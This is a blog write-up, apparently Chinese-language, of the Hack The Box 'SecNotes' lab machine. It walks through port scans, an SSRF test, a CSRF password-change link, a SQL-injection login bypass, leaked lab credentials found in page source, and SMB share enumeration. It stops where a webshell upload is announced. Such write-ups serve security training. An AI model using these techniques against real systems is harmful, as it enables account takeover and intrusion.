@@ -1,0 +1,825 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x00 靶场技能介绍章节技能：SSRF任意请求漏洞、CSRF密码修改漏洞、管理员用户注册SQL注入绕过、首页源码敏感信息泄露、WEBshell与NC反弹shell、FTP登录与文件上传、WSL子系统、子系统敏感信息泄露">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SecNotes-htb-writeup">
+<meta property="og:url" content="https://sh1yan.top/2024/03/29/SecNotes-htb-writeup/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 靶场技能介绍章节技能：SSRF任意请求漏洞、CSRF密码修改漏洞、管理员用户注册SQL注入绕过、首页源码敏感信息泄露、WEBshell与NC反弹shell、FTP登录与文件上传、WSL子系统、子系统敏感信息泄露">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/1.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/2.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/3.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/4.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/5.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/6.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/7.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/8.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/9.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/10.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/11.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/12.png">
+<meta property="og:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/13.png">
+<meta property="article:published_time" content="2024-03-29T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-04-29T03:00:57.826Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="shooting-range">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://sh1yan.top/photo/SecNotes-htb-writeup/1.png">
+  
+  
+  
+  <title>SecNotes-htb-writeup - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SecNotes-htb-writeup"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-03-29 23:50" pubdate>
+          2024年3月29日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          144 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SecNotes-htb-writeup</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="0x00-靶场技能介绍"><a href="#0x00-靶场技能介绍" class="headerlink" title="0x00 靶场技能介绍"></a>0x00 靶场技能介绍</h4><p>章节技能：SSRF任意请求漏洞、CSRF密码修改漏洞、管理员用户注册SQL注入绕过、首页源码敏感信息泄露、WEBshell与NC反弹shell、FTP登录与文件上传、WSL子系统、子系统敏感信息泄露</p>
+<span id="more"></span>  
+
+<p>参考链接：<code>https://0xdf.gitlab.io/2019/01/19/htb-secnotes.html</code></p>
+<h4 id="0x01-用户权限获取"><a href="#0x01-用户权限获取" class="headerlink" title="0x01 用户权限获取"></a>0x01 用户权限获取</h4><p>1、获取下靶机IP地址：10.10.10.97</p>
+<p>2、扫描下开放端口情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -p- --min-rate=<span class="hljs-number">10000</span> -oG allports <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span> <br>[sudo] kali 的密码：<br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-28 21:43 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span><br>Host is up (<span class="hljs-number">0.50</span>s latency).<br>Not shown: <span class="hljs-number">65532</span> filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br><span class="hljs-number">80</span>/tcp   open  http<br><span class="hljs-number">445</span>/tcp  open  microsoft-ds<br><span class="hljs-number">8808</span>/tcp open  ssports-bcast<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">23.09</span> seconds<br>                                                                                                       <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ grep -oP <span class="hljs-string">&#x27;([0-9]+)/open&#x27;</span> allports | awk -F/ <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | tr <span class="hljs-string">&#x27;\n&#x27;</span> <span class="hljs-string">&#x27;,&#x27;</span><br><span class="hljs-number">80</span>,<span class="hljs-number">445</span>,<span class="hljs-number">8808</span>,                                                                                                       <br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo nmap -sV -sC -p80,<span class="hljs-number">445</span>,<span class="hljs-number">8808</span> -Pn --min-rate=<span class="hljs-number">10000</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span> <br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https:<span class="hljs-comment">//nmap.org ) at 2024-03-28 21:44 CST</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span><br>Host is up (<span class="hljs-number">0.31</span>s latency).<br><br>PORT     STATE SERVICE      VERSION<br><span class="hljs-number">80</span>/tcp   open  http         Microsoft IIS httpd <span class="hljs-number">10.0</span><br>| http-title: Secure Notes - Login<br>|_Requested resource was login.php<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span><br><span class="hljs-number">445</span>/tcp  open  microsoft-ds Microsoft Windows <span class="hljs-number">7</span> - <span class="hljs-number">10</span> microsoft-ds (workgroup: HTB)<br><span class="hljs-number">8808</span>/tcp open  http         Microsoft IIS httpd <span class="hljs-number">10.0</span><br>|_http-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span><br>|_http-title: IIS Windows<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time: <br>|   date: <span class="hljs-number">2024</span><span class="hljs-number">-03</span><span class="hljs-number">-28</span>T13:<span class="hljs-number">45</span>:<span class="hljs-number">15</span><br>|_  start_date: N/A<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but <span class="hljs-keyword">default</span>)<br>| smb2-security-mode: <br>|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: <br>|_    Message signing enabled but not required<br><br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">54.63</span> seconds<br></code></pre></td></tr></table></figure>
+
+<p>3、访问80和8808这两个端口服务，查看下内容</p>
+<p><code>http://10.10.10.97/login.php</code></p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.10.97:8808/</code></p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p>5、在80端口上注册一个账号，并登录查看信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">http:<span class="hljs-comment">//10.10.10.97/register.php</span><br><br>shiyan<br>shiyan<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.10.97/home.php</code></p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>6、发现 contact.php 页面可以输入链接地址，且会访问这个链接地址，说明这个是一个漏洞点</p>
+<p><code>http://10.10.10.97/contact.php</code></p>
+<p><code>在这个页面发送一个带有链接地址 http://10.10.14.11:443</code></p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">443</span> <br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>] <span class="hljs-number">50709</span><br>GET / HTTP/<span class="hljs-number">1.1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT; Windows NT <span class="hljs-number">10.0</span>; en-US) WindowsPowerShell/<span class="hljs-number">5.1</span><span class="hljs-number">.17134</span><span class="hljs-number">.228</span><br>Host: <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>:<span class="hljs-number">443</span><br>Connection: Keep-Alive<br></code></pre></td></tr></table></figure>
+
+<p>我们的nc监听了一个请求，那我继续发送一个带有链接和具体资源指向的地址</p>
+<p><code>http://10.10.14.11:443/whoami?id=1</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>] <span class="hljs-number">50759</span><br>GET /whoami?id=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT; Windows NT <span class="hljs-number">10.0</span>; en-US) WindowsPowerShell/<span class="hljs-number">5.1</span><span class="hljs-number">.17134</span><span class="hljs-number">.228</span><br>Host: <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>:<span class="hljs-number">443</span><br>Connection: Keep-Alive<br></code></pre></td></tr></table></figure>
+
+<p>7、研究发现用户修改密码处没有CSRF保护，而且下方POST输入的内容个，可以已GET形式访问，并正常修改密码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">POST /change_pass.php HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (X11; Linux aarch64; rv:<span class="hljs-number">109.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">115.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate, br</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">Content-Length: 53</span><br><span class="hljs-comment">Origin: http://10.10.10.97</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Referer: http://10.10.10.97/change_pass.php</span><br><span class="hljs-comment">Cookie: PHPSESSID=m2gen71sbodh3po4vicm3h2rag</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">password=123456&amp;confirm_password=123456&amp;submit=submit</span><br></code></pre></td></tr></table></figure>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>http://10.10.10.97/change_pass.php?password=password&amp;confirm_password=password&amp;submit=submit</code></p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>8、那我们把这个地址发送给管理员用户尝试下</p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/9.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>9、显示 Message Sent  ，那我们尝试登录下另一个管理员账号看看，但是登录失败了，说明CSRF失败了，看来靶机太老了。。。</p>
+<p>10、这里重新注册一个账号，使用sql注入绕过尝试下</p>
+<p><code>&#39; or &#39;1&#39;=&#39;1</code><br><code>123456</code></p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>11、成功登录成功~</p>
+<p>12、并且在 home.php的网站源码下发现了一个账号密码信息</p>
+<p><code>view-source:http://10.10.10.97/home.php</code></p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/12.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;pre&gt;\\secnotes.htb\new-site<br>tyler / <span class="hljs-number">92</span>g!mA8BGjOirkL%OG*&amp;&lt;/pre&gt;<br></code></pre></td></tr></table></figure>
+
+<p>13、验证该账号密码是否可以登录Windows靶机服务</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec smb <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span> -u tyler -p <span class="hljs-string">&#x27;92g!mA8BGjOirkL%OG*&amp;&#x27;</span><br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>     <span class="hljs-number">445</span>    SECNOTES         [*] Windows <span class="hljs-number">10</span> Enterprise <span class="hljs-number">17134</span> (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)<br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>     <span class="hljs-number">445</span>    SECNOTES         [+] SECNOTES\tyler:<span class="hljs-number">92</span>g!mA8BGjOirkL%OG*&amp; <br><br><br>是Windows上的密码，可以正常登录<br><br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbclient -L <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span> -U tyler%<span class="hljs-string">&#x27;92g!mA8BGjOirkL%OG*&amp;&#x27;</span><br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>        new-site        Disk      <br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span> failed (Error NT_STATUS_IO_TIMEOUT)<br>Unable to connect with SMB1 -- no workgroup available<br></code></pre></td></tr></table></figure>
+
+<p>14、接下来使用 smbmap查看共享目录情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ smbmap -H <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span> -u tyler -p <span class="hljs-string">&#x27;92g!mA8BGjOirkL%OG*&amp;&#x27;</span><br><br>    ________  ___      ___  _______   ___      ___       __         _______<br>   /<span class="hljs-string">&quot;       )|&quot;</span>  \    /<span class="hljs-string">&quot;  ||   _  &quot;</span>\ |<span class="hljs-string">&quot;  \    /&quot;</span>  |     /<span class="hljs-string">&quot;&quot;</span>\       |   __ <span class="hljs-string">&quot;\</span><br><span class="hljs-string">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span><br><span class="hljs-string">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span><br><span class="hljs-string">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span><br><span class="hljs-string">   /&quot;</span> \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \<br>  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)<br> -----------------------------------------------------------------------------<br>     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com<br>                     https:<span class="hljs-comment">//github.com/ShawnDEvans/smbmap</span><br><br>[*] Detected <span class="hljs-number">1</span> hosts serving SMB<br>[*] Established <span class="hljs-number">1</span> SMB session(s)                                <br>                                                                                                    <br>[+] IP: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>:<span class="hljs-number">445</span> Name: <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>               Status: Authenticated<br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        ADMIN$                                                  NO ACCESS       Remote Admin<br>        C$                                                      NO ACCESS       Default share<br>        IPC$                                                    READ ONLY       Remote IPC<br>        new-site                                                READ, WRITE<br></code></pre></td></tr></table></figure>
+
+<p>15、尝试将WEBSHELL写入到可以写入的目录，并尝试获取反弹shell</p>
